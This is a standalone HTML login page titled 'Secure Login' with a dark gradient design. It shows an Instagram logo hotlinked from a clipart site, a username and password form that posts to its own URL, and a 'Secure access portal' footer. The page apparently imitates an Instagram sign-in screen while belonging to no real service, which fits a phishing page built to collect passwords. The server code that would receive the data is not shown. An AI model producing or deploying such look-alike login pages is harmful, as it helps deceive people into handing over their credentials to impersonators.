<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Secure Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
            font-family: Arial, sans-serif;
        }

        .login-box {
            background: rgba(0, 0, 0, 0.75);
            padding: 40px;
            border-radius: 12px;
            width: 320px;
            text-align: center;
            box-shadow: 0 0 25px rgba(0, 0, 0, 0.5);
        }

        .logo-img {
            height: 40px;
            width: auto;
            margin-bottom: 25px;
        }

        .login-box h2 {
            color: white;
            margin-bottom: 20px;
            font-weight: 500;
        }

        .input-field {
            width: 100%;
            padding: 12px;
            margin-bottom: 18px;
            border-radius: 8px;
            border: 1px solid #555;
            background: #1e1e1e;
            color: white;
            font-size: 14px;
        }

        .input-field:focus {
            outline: none;
            border-color: #4da3ff;
        }

        .btn {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            background: #1877f2;
            color: white;
            font-size: 15px;
            cursor: pointer;
            transition: 0.3s;
        }

        .btn:hover {
            background: #145dc1;
        }

        .footer-text {
            margin-top: 15px;
            font-size: 12px;
            color: #aaa;
        }
    </style>
</head>

<body>

    <div class="login-box">

        <img src="https://clipart.info/images/ccovers/1516920567instagram-png-logo-transparent.png" class="logo-img">

        <h2>Login</h2>

        <form method="POST">
            <input type="text" name="username" class="input-field" placeholder="Username" required>
            <input type="password" name="password" class="input-field" placeholder="Password" required>
            <button type="submit" class="btn">Log In</button>
        </form>

        <div class="footer-text">
            Secure access portal
        </div>

    </div>

</body>

</html>
